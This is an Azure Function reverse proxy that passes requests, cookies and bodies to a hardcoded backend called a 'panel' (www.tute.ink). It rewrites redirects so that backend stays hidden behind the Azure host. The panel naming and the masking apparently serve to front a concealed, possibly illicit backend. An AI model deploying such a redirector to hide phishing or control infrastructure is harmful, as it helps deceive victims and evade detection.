const PANEL = 'www.tute.ink';

module.exports = async function (context, req) {
    let path = req.headers['x-ms-original-url'] || req.url || '/';
    try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
    path = path.replace(/^\/api\/proxy/, '') || '/';
    if (!path.startsWith('/')) path = '/' + path;

    if (req.query && Object.keys(req.query).length > 0) {
        const qs = new URLSearchParams(req.query).toString();
        if (!path.includes('?')) path += '?' + qs;
    }

    if (path.startsWith('/cdn-cgi/')) {
        context.res = { status: 404, body: '' };
        return;
    }

    context.log('Forwarding to:', path);

    const forwardHeaders = {
        'Host': PANEL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': req.headers['accept'] || '*/*',
        'X-Ablegod-Worker': '1'      // ← tells panel this came through a worker
    };
    if (req.headers['cookie'])       forwardHeaders['Cookie']       = req.headers['cookie'];
    if (req.headers['content-type']) forwardHeaders['Content-Type'] = req.headers['content-type'];

    let body;
    if (!['GET','HEAD'].includes(req.method) && req.body) {
        body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
        if (!forwardHeaders['Content-Type']) forwardHeaders['Content-Type'] = 'application/json';
    }

    try {
        const r = await fetch(`https://${PANEL}${path}`, {
            method: req.method,
            headers: forwardHeaders,
            body: body,
            redirect: 'manual'
        });

        const responseBody = await r.text();
        const contentType  = r.headers.get('content-type') || 'text/html';

        // If Flask returns a redirect to tute.ink, rewrite it to the Azure host
        let location = r.headers.get('location') || '';
        if (location.startsWith('https://www.tute.ink') || location.startsWith('https://tute.ink')) {
            const azureHost = req.headers['host'] || context.req.headers['host'];
            location = location.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${azureHost}`);
        }

        const respHeaders = {
            'Content-Type': contentType,
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, Authorization'
        };
        if (location) respHeaders['Location'] = location;
        const setCookie = r.headers.get('set-cookie');
        if (setCookie) respHeaders['Set-Cookie'] = setCookie;

        context.res = { status: r.status, headers: respHeaders, body: responseBody };
    } catch (e) {
        context.log('Error:', e.message);
        context.res = { status: 500, body: 'Proxy Error: ' + e.message };
    }
};
